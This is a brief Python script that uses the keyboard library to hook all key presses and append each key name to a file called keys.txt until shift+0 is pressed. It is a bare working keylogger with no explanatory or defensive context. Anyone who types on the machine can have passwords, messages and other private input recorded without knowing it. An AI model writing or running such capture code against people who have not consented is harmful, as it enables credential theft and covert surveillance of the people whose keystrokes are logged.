import keyboard

def key_pressed(e):
    f=open('keys.txt', 'a+')
    f.write(e.name+"\n")
keyboard.on_press(key_pressed)
keyboard.wait("shift+0")
